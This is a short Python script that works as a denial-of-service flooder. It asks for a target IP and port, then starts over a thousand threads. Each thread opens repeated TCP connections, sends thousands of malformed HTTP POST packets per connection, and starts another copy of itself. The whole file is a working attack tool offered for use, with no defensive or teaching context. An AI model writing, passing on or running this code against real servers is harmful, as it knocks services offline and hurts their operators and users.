import socket,threading,random,string

def generate_url_path(num):
  return "".join(random.sample(string.ascii_letters + string.digits + string.punctuation, int(num)))

def http_low(ip,port):
    for _ in range(250):
       try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((str(ip),int(port)))
        s.connect_ex((str(ip),int(port)))
        http_packet = f'POST /{generate_url_path(1)} HTTP/1.1\nHost: {ip}\n\n\r\r'.encode()
        for _ in range(2500):
          s.send(http_packet)
          s.sendall(http_packet)
       except:
         pass
    threading.Thread(target=http_low,args=(ip,port)).start()

ip = input("IP ?")
port = input("PORT ?")

for a in range(250):
  for _ in range(5):
    threading.Thread(target=http_low,args=(ip,port)).start()
